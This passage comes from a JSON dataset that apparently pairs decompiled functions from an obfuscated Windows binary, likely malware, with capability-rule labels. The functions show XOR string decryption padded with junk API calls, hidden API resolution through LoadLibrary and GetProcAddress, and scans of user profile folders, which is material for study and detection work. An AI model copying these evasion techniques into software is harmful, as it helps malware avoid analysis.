}\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x15);\n                *0x41ddc8 = fcn.0040c9e0(iVar2);\n                if (*0x41ddc8 != 0) {\n                    uVar1 = (*pcVar5)(0, iVar2);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_10h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_4h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, var_14h);\n                    (*pcVar7)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar3);\n                    (*pcVar7)(uVar1);\n                    goto code_r0x0040c891;\n                }\n                uVar1 = (*pcVar5)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_10h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_4h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar5)(0, var_14h);\n                goto code_r0x0040c615;\n            }\n            uVar1 = (*pcVar5)(0, var_10h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        }\n        (*pcVar5)(uVar1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar5)(uVar1);\n        uVar1 = (*pcVar7)(0, iVar3);\n        (*pcVar5)(uVar1);\n    }\ncode_r0x0040c896:\n    *0x41ddc4 = *0x41ddc0 >> 0x20;\n    *0x41ddcc = *0x41ddc8 >> 0x20;\n    *0x41ddbc = *0x41ddb8 >> 0x20;\n    *0x41ddb4 = *0x41ddb0 >> 0x20;\n    return var_ch;\n}\n",
        "token_count": 2785
    },
    "0040cb61": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040cb61(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpLibFileName;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0x3525562a;\n    var_24h = 0x55384523;\n    var_20h._0_2_ = 0x4635;\n    lpLibFileName = 0x35555645;\n    var_10h._0_1_ = 0x46;\n    var_18h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar8 = 0;\n    var_ch = &var_28h - iVar3;\n    var_8h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar4 != 0x26d40a) {\n            *(iVar8 + iVar3) = *(&lpLibFileName + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_38h = 0x780b2916;\n    var_34h = 0x60537600;\n    var_30h = 0x61292050;\n    var_24h = 0x344e6145;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x4c);\n    uVar2 = (*pcVar6)(8, 0xd);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_38h - iVar3;\n    lpLibFileName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar4 != 0xec74dc) {\n            *(iVar8 + iVar3) = *(&var_24h + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_38h = 0x16170264;\n    var_34h = 0xf4f733b;\n    var_30h = 0x53230f11;\n    var_2ch._0_2_ = 0x6a60;\n    var_24h = 0x7a726a37;\n    var_20h._0_2_ = 0x3657;\n    uVar2 = (*pcVar6)(8, 0xf);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_ch = &var_38h - iVar3;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        iVar4 = lpLibFileName;\n        if (iVar5 != 0x7db198) {\n            var_ch = 6;\n            *(iVar8 + iVar3) = *(&var_24h + iVar8 % 6) ^ (iVar8 + iVar3)[&var_38h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar3);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar7 = (*pcVar6)(0, var_8h, var_1ch, var_18h, 0, 0);\n    if (0x20 < uVar7) {\n        uVar7 = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*pcVar6)(uVar2);\n    uVar2 = (*pcVar1)(0, var_8h);\n    (*pcVar6)(uVar2);\n    return uVar7;\n}\n",
        "token_count": 1190
    },
    "0040d8bf": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040d8bf(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    code *pcVar14;\n    int16_t *piVar15;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    uint var_c4h;\n    int32_t lpString2;\n    int32_t var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t hFindFile;\n    uchar *ARG_0;\n    int16_t *var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uchar *lpFileName;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar var_20h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint32_t var_13h;\n    int32_t dwBytes;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_c4h = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_5ch = piVar4;\n        uVar3 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(8, 0x208);\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            puVar6 = &lpFindFileData;\n            ARG_0 = puVar5;\n            for (iVar10 = 0x250; piVar4 = var_5ch,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = lpFileName;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar15 = var_5ch;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar10 = (*pcVar2)(var_5ch, &dwBytes);\n            if (iVar10 != 0) {\n                iVar10 = lpFileName - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(piVar4 + iVar10) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                var_54h = 0x786f4137;\n                var_50h = 0x41417767;\n                var_4ch._0_2_ = 0x7845;\n                var_8h = 0x7845416b;\n                var_4h._0_2_ = 0x7749;\n                uVar3 = (*pcVar14)(8, 0x15);\n                puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                var_b8h = 6;\n                iVar10 = 0;\n                lpMem = puVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                    if (iVar7 != 0x38589e) {\n                        *(iVar10 + puVar6) = *(&var_8h + iVar10 % var_b8h) ^ (iVar10 + puVar6)[&var_54h - puVar6];\n                    }\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar10 = iVar10 + 1;\n                    puVar12 = puVar6;\n                } while (iVar10 < 10);\n                do {\n                    iVar1 = *puVar12;\n                    puVar12 = puVar12 + 2;\n                } while (iVar1 != 0);\n                uVar13 = puVar12 - puVar6;\n                puVar12 = lpFileName + -2;\n                do {\n                    piVar4 = puVar12 + 2;\n                    puVar12 = puVar12 + 2;\n                } while (*piVar4 != 0);\n                for (uVar11 = uVar13 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_58h = 0x7779421a;\n                    var_6ch = 0x77794234;\n                    var_68h._0_1_ = 0x79;\n                    var_7ch = 0x3746556a;\n                    var_78h._0_2_ = 0x446c;\n                    var_74h = 0x37685544;\n                    var_70h._0_1_ = 0x6c;\n                    var_bch = 5;\n                    do {\n                        uVar3 = (*pcVar14)(8, 9);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        lpString2 = iVar10;\n                        var_44h = &var_58h - iVar10;\n                        do {\n                            iVar8 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                            if (iVar8 != 0xdd4b4c) {\n                                *(iVar7 + iVar10) = *(&var_6ch + iVar7 % var_bch) ^ (iVar7 + iVar10)[&var_58h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 4);\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        var_d0h = iVar10;\n                        var_44h = &var_7ch - iVar10;\n                        do {\n                            iVar9 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                            iVar8 = lpString2;\n                            if (iVar9 != 0xc316fe) {\n                                *(iVar7 + iVar10) = *(&var_74h + iVar7 % var_bch) ^ (iVar7 + iVar10)[&var_7ch - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 6);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar7 != 0) &&\n                            (iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10),  iVar7 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_38h = 0x55034d25;\n                            var_34h = 0x4d084e0c;\n                            var_30h = 0x4e4f5500;\n                            var_2ch = 0x55094d3a;\n                            var_28h = 0x4d1d4e1b;\n                            var_24h = 0x4e015505;\n                            _var_20h = 0x551f4d0e;\n                            stack0xffffffe0 = 0x4d3d4e33;\n                            stack0xffffffe4 = 0x4e025509;\n                            var_17h._3_1_ = 0x19;\n                            var_13h._0_2_ = 0x6c4d;\n                            var_13h._2_1_ = 0x55;\n                            var_84h = 0x556c4d69;\n                            var_80h._0_2_ = 0x4e6f;\n                            uVar3 = (*pcVar14)(8, 0x51);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_44h = iVar10;\n                            unique0x1000060f = &var_38h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                                if (iVar8 != 0xb478a5) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_84h + iVar7 % var_b8h) ^ (iVar7 + iVar10)[&var_38h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x28);\n                            var_b4h = 0x4b3c4479;\n                            var_b0h = 0x447c4545;\n                            var_ach = 0x45414b2d;\n                            var_a8h = 0x4b104459;\n                            var_a4h = 0x44574579;\n                            var_a0h = 0x45544b2f;\n                            var_9ch = 0x4b104454;\n                            var_98h = 0x445d4561;\n                            var_94h = 0x45454b21;\n                            var_90h._0_2_ = 0x4438;\n                            var_8ch = 0x4b4c4438;\n                            var_88h._0_2_ = 0x4535;\n                            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_cch = iVar10;\n                            unique0x1000060b = &var_b4h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                                if (iVar8 != 0x70b5e6) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_8ch + iVar7 % var_b8h) ^ (iVar7 + iVar10)[&var_b4h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x26);\n                            var_50h = var_44h;\n                            stack0xffffffec = 0;\n                            var_8h = 0x6972556e;\n                            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x67);\n                            pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            var_54h = iVar10;\n                            do {\n                                var_40h = 0x6901554b;\n                                var_3ch = 0x72706e3b;\n                                var_38h = 0x5532671a;\n                                var_34h = 0x6e146957;\n                                var_30h = 0x671c7209;\n                                var_2ch = 0x6918551f;\n                                var_28h = 0x723e6e04;\n                                var_24h = 0x5509670c;\n                                _var_20h = 0x6e0f6907;\n                                stack0xffffffe0 = 0x67477239;\n                                stack0xffffffe4 = 0x691f551a;\n                                var_17h._3_1_ = 0x17;\n                                var_13h._0_2_ = 0x556e;\n                                var_13h._2_1_ = 0x72;\n                                uVar3 = (*pcVar14)(8, 0x61);\n                                iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                iVar7 = 0;\n                                var_c8h = &var_40h - iVar10;\n                                do {\n                                    iVar8 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                                    puVar5 = ARG_0;\n                                    if (iVar8 != 0xd15ca3) {\n                                        *(iVar7 + iVar10) =\n                                             *(&var_8h + iVar7 % var_bch) ^ (iVar7 + iVar10)[&var_40h - iVar10];\n                                    }\n                                    iVar7 = iVar7 + 1;\n                                } while (iVar7 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar10, var_5ch, &lpString1, (&var_54h)[stack0xffffffec]);\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar5);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar7 != -1) {\n                                    fcn.0040ae1f();\n                                    var_c4h = 1;\n                                }\n                                uVar3 = (*pcVar14)(0, iVar10);\n                                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                *NULL = stack0xffffffec + 1;\n                            } while (*NULL < 2);\n                            uVar3 = (*pcVar14)(0, var_cch);\n                            (*pcVar2)(uVar3);\n                            uVar3 = (*pcVar14)(0, var_44h);\n                            (*pcVar2)(uVar3);\n                            iVar10 = var_d0h;\n                            iVar8 = lpString2;\n                        }\n                        uVar3 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        uVar3 = (*pcVar14)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar3 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                piVar4 = var_5ch;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar3 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (ARG_0 != NULL) {\n            uVar3 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    return var_c4h;\n}\n",
        "token_count": 3969
    },
    "0040e7fb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040e7fb(uint param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar2 = fcn.0040e2b2(&var_8h);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrDupW)(param_1);\n        var_14h = iVar2;\n        var_10h = fcn.0040d04b();\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x645e4854;\n            var_28h = 0x481c5857;\n            var_24h._0_2_ = 0x6437;\n            var_20h = 0x6437487a;\n            var_1ch._0_2_ = 0x5839;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = iVar7;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                iVar2 = var_14h;\n                iVar7 = var_18h;\n                if (iVar5 != 0x32ba43) {\n                    var_ch = 6;\n                    *(iVar8 + piVar4) = *(&var_20h + iVar8 % 6) ^ (iVar8 + piVar4)[&var_2ch - piVar4];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 10);\n            piVar6 = piVar4;\n            do {\n                iVar1 = *piVar6;\n                *((var_10h - piVar4) + piVar6) = iVar1;\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar8 = fcn.0040aa7f(var_8h);\n        if (iVar8 == 0) {\n            iVar8 = fcn.0040e3be();\n            if (iVar8 != 0) {\n                iVar7 = 1;\n            }\n        }\n        if (iVar2 != 0) {\n            uVar3 = (*pcVar9)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        uVar3 = (*pcVar9)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar7;\n}\n",
        "token_count": 831
    },
    "0040ef18": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040ef18(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_41h;\n    uchar uStack65;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uchar *var_24h;\n    code *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint hObject;\n    uint *var_ch;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    \n    puVar9 = &var_6ch;\n    var_24h = param_2;\n    for (iVar6 = 0x18; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_3ch = *0x41dd6c;\n    var_38h = 0;\n    dwBytes = 0;\n    var_18h = 0;\n    var_48h._0_2_ = 0x210d;\n    var_ch = 0x6;\n    var_48h._2_1_ = 6;\n    stack0xffffffb7 = 0x7401d55;\n    var_41h._0_1_ = 0x39;\n    var_41h._1_1_ = 0xe;\n    var_41h._2_1_ = 0x39;\n    var_34h = 0x39625563;\n    var_30h._0_2_ = 0x6e71;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x7d2cca) {\n            *(iVar7 + iVar6) = *(&var_34h + iVar7 % var_ch) ^ (iVar7 + iVar6)[&var_48h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_4ch = 0x14760223;\n    var_48h._0_2_ = 0x713;\n    var_48h._2_1_ = 0x29;\n    stack0xffffffb7 = 0x13075607;\n    var_41h._0_1_ = 0x1a;\n    var_41h._1_1_ = 10;\n    var_41h._2_1_ = 0x75;\n    var_34h = 0x64397579;\n    var_30h._0_2_ = 0x6976;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_2ch = iVar6;\n    var_1ch = &var_4ch - iVar6;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xc96aef) {\n            *(iVar7 + iVar6) = *(&var_34h + iVar7 % var_ch) ^ (iVar7 + iVar6)[&var_4ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_6ch = 0x18;\n    var_68h = 0;\n    var_60h = 0;\n    var_64h = 0;\n    var_5ch = 0;\n    var_58h = 0;\n    iVar7 = (*pcVar5)(&var_14h, 0x400, &var_6ch, &var_3ch);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_50h = 0x3f1d1a62;\n        var_4ch = 0x203d563d;\n        var_48h._0_2_ = 0x3b20;\n        var_48h._2_1_ = 0x5d;\n        stack0xffffffb7 = 0x371b211e;\n        var_41h._0_1_ = 0x53;\n        var_41h._1_1_ = 8;\n        var_41h._2_1_ = 0x3c;\n        var_41h._3_1_ = 0x4f;\n        var_34h = 0x4f526d38;\n        var_30h._0_2_ = CONCAT11(var_30h._1_1_, 0x58);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_20h = 0x5;\n        iVar7 = 0;\n        var_28h = iVar6;\n        var_1ch = &var_50h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            iVar3 = lpLibFileName;\n            if (iVar4 != 0x9f97e6) {\n                *(iVar7 + iVar6) = *(&var_34h + iVar7 % var_20h) ^ (iVar7 + iVar6)[&var_50h - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x13);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        iVar7 = (*pcVar5)(var_14h, 8, &hObject);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar7) {\n            var_54h = 0x19383200;\n            var_50h = 0xc232530;\n            var_4ch = 0x253a0a07;\n            var_48h._0_2_ = 0x2437;\n            var_48h._2_1_ = 0x1d;\n            stack0xffffffb7 = 0xe393a05;\n            var_41h._0_1_ = 0x2a;\n            var_41h._1_1_ = 2;\n            var_41h._2_1_ = 9;\n            var_41h._3_1_ = 0x3b;\n            uStack65 = 0x57;\n            var_34h = 0x6c69455a;\n            var_30h._0_2_ = 0x5755;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_20h = &var_54h - iVar6;\n            var_1ch = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                iVar3 = lpLibFileName;\n                if (iVar4 != 0x4d91d2) {\n                    *(iVar7 + iVar6) = *(&var_34h + iVar7 % var_ch) ^ (iVar7 + iVar6)[&var_54h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x18);\n            uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n            var_20h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*var_20h)(hObject, 1, 0, 0, &dwBytes);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_ch != NULL) {\n                iVar7 = (*var_20h)(hObject, 1, var_ch, dwBytes, &dwBytes);\n                if (-1 < iVar7) {\n                    puVar8 = *var_ch;\n                    puVar10 = var_24h;\n                    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_18h = 1;\n                    iVar6 = var_1ch;\n                    iVar3 = lpLibFileName;\n                }\n                uVar2 = (*pcVar5)(0, var_ch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar2 = (*pcVar5)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar6 = var_28h;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_14h);\n        uVar2 = (*pcVar5)(0, iVar6);\n        